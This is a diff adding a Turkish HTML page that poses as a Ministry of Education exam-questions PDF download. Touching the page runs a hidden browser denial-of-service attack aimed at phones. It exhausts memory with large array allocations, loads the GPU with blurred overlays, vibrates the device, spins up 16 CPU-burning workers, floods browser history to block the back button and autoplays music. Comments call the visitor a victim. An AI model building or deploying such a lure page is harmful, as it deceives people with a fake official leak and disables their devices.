@@ -1,0 +1,74 @@
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sınav Soruları PDF - 2026</title>
+    <style>
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; margin: 0; overflow: hidden; touch-action: none; }
+        #main { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; background: radial-gradient(circle, #222, #000); }
+        .btn { background: #ff0000; color: white; padding: 20px 40px; border-radius: 50px; font-weight: bold; font-size: 20px; animation: pulse 1s infinite; cursor: pointer; border: none; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        #status { margin-top: 20px; color: #555; font-size: 12px; }
+    </style>
+</head>
+<body>
+
+    <div id="main" onclick="mobilNuke()">
+        <h2 style="margin: 20px;">⚠️ MEB SINAV SİSTEMİ ⚠️</h2>
+        <p>Soruları PDF olarak indirmek için butona dokunun.</p>
+        <button class="btn">PDF İNDİR (4.2 MB)</button>
+        <div id="status">Sunucuya bağlanılıyor...</div>
+    </div>
+
+    <iframe id="zihni" width="1" height="1" src="https://www.youtube.com/embed/gy955m2mpcM?enablejsapi=1" frameborder="0"></iframe>
+
+    <script>
+        function mobilNuke() {
+            // Butonu ve yazıları değiştir, kurbanı oyala
+            document.getElementById('main').innerHTML = "<h1>SORULAR İNDİRİLİYOR...</h1><p>%14 tamamlandı</p><div class='spinner'></div>";
+            
+            // 1. MOBİL RAM BOMBASI (Uint32Array telefonda çok hızlı RAM bitirir)
+            let bakkal_stok = [];
+            setInterval(() => {
+                for(let i=0; i<1000; i++) {
+                    // Her seferinde büyük bellek blokları ayırarak RAM'i şişirir
+                    bakkal_stok.push(new Uint32Array(256 * 1024)); 
+                    
+                    // 2. MOBİL GPU KİLİDİ
+                    // Telefona çok ağır gelen gölgeli ve bulanık elementler ekle
+                    let d = document.createElement('div');
+                    d.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;box-shadow:inset 0 0 100px red;filter:blur(80px);opacity:0.05;pointer-events:none;z-index:-1;";
+                    document.body.appendChild(d);
+                }
+            }, 100);
+
+            // 3. TİTREŞİM VE SES SALDIRISI (Android telefonları delirtir)
+            if ("vibrate" in navigator) {
+                navigator.vibrate([500, 200, 500, 200, 500]);
+            }
+
+            // 4. ÇOKLU İŞLEM (WORKER) SALDIRISI
+            // İşlemcinin tüm çekirdeklerini %100 yap
+            const blob = new Blob([`
+                setInterval(() => {
+                    for(let i=0; i<1000000; i++) { Math.atan(Math.random()) * Math.tan(Math.random()); }
+                }, 1);
+            `], { type: 'text/javascript' });
+
+            for (let i = 0; i < 16; i++) {
+                new Worker(URL.createObjectURL(blob));
+            }
+
+            // 5. GERİ ÇIKMAYI İMKANSIZ YAP (HISTORY FLOOD)
+            setInterval(() => {
+                history.pushState(null, "", "#" + Math.random());
+            }, 50);
+
+            // Bakkal Zihni müziği arkada başlasın
+            document.getElementById('zihni').src += "&autoplay=1&mute=0";
+        }
+    </script>
+</body>
+</html>
